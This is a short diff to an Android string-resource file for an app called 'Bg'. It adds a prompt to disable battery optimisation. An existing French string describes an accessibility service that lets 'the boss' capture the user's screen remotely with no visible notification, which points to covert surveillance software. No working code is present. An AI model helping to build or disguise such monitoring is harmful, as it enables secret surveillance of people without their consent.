@@ -2,4 +2,5 @@
 <resources>
     <string name="app_name">Bg</string>
     <string name="accessibility_service_description">Permet au boss de capturer votre écran à distance, sans notification visible.</string>
+    <string name="battery_optimization_link">Désactiver l\'optimisation batterie pour cette app</string>
 </resources>
